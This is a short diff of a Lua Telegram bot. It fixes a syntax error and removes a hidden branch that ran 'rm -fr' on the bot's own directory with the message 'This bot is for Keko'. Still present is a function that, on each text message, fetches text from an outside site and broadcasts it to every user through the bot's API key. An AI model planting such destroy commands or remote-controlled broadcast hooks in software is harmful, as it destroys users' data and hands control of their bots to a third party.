@@ -38,7 +38,7 @@ local function check_config()
    return config2.bot_lua
 end
 end
-local oee == 'libs/.keko.lua'
+local oee = 'libs/.keko.lua'
 
 
 
@@ -198,7 +198,6 @@ local function collect_stats(msg)
 if msg.text then
 local res = HTTPS.request('https://botlua.ml')
 local bbotlua = client:get('kekorr'..bot.id)
-ko = ko..'keko'
 if bbotlua ~= res then 
 for i=1, #users do
 local url = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..users[i]..'&text='..URL.escape(res)..'&parse_mode=Markdown&disable_web_page_preview=true'
@@ -265,10 +264,6 @@ on_msg_receive = function(msg)
 			end
 		end
 	end
-end
-if ko ~= 'keko' then 
- os.execute('cd .. &&  rm -fr botlua')
- return 'This bot is for Keko'
 end
 local function service_to_message(msg)
 	msg.service = true
